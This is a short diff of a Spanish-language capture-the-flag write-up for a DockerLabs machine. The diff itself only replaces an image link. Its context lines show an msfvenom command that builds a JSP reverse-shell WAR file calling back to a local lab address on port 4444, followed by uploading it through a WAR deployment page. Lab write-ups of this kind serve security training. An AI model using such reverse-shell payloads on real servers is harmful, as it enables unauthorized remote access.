@@ -117,7 +117,8 @@ creamos un archivo malicioso:
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o rev.war
 
 lo subimos en el apartado de "WAR"
-![[dockerlabs/dificil/crackoff/war.png]]
+
+![image](https://github.com/user-attachments/assets/1b98e90d-1784-408a-8e54-70d09ee51e97)
 
 cargamos y a parecerá en la parte principal de la pagina como "rev"
 ![[rev.png]]
